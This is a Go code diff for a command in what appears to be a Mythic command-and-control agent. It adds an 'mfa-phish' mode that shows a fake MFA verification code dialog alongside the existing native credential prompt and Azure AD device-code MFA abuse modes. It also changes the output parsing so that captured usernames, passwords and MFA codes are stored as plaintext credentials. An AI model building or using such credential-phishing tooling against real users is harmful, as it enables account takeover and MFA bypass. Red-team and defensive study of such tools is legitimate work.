@@ -32,8 +32,8 @@ func init() {
 				ModalDisplayName: "Action",
 				CLIName:          "action",
 				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
-				Choices:          []string{"dialog", "device-code"},
-				Description:      "Action: dialog (native credential prompt) or device-code (OAuth MFA abuse via Azure AD device code flow)",
+				Choices:          []string{"dialog", "device-code", "mfa-phish"},
+				Description:      "Action: dialog (native credential prompt), device-code (OAuth MFA abuse via Azure AD device code flow), or mfa-phish (fake MFA verification code dialog)",
 				DefaultValue:     "dialog",
 				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
 					{
@@ -167,24 +167,35 @@ func init() {
 			}
 			// Parse output format:
 			//   User:     <username>
-			//   Password: <password>
-			var username, password string
+			//   Password: <password>      (dialog mode)
+			//   Code:     <code>          (mfa-phish mode)
+			var username, credential, credType string
 			for _, line := range strings.Split(responseText, "\n") {
 				trimmed := strings.TrimSpace(line)
 				if strings.HasPrefix(trimmed, "User:") {
 					username = strings.TrimSpace(strings.TrimPrefix(trimmed, "User:"))
 				} else if strings.HasPrefix(trimmed, "Password:") {
-					password = strings.TrimSpace(strings.TrimPrefix(trimmed, "Password:"))
+					credential = strings.TrimSpace(strings.TrimPrefix(trimmed, "Password:"))
+					credType = "dialog"
+				} else if strings.HasPrefix(trimmed, "Code:") {
+					credential = strings.TrimSpace(strings.TrimPrefix(trimmed, "Code:"))
+					credType = "mfa-phish"
 				}
 			}
-			if username != "" && password != "" {
+			if username != "" && credential != "" {
+				comment := "credential-prompt dialog capture"
+				realm := "local"
+				if credType == "mfa-phish" {
+					comment = "credential-prompt mfa-phish capture"
+					realm = "mfa-phish"
+				}
 				registerCredentials(processResponse.TaskData.Task.ID, []mythicrpc.MythicRPCCredentialCreateCredentialData{
 					{
 						CredentialType: "plaintext",
-						Realm:          "local",
+						Realm:          realm,
 						Account:        username,
-						Credential:     password,
-						Comment:        "credential-prompt dialog capture",
+						Credential:     credential,
+						Comment:        comment,
 					},
 				})
 			}
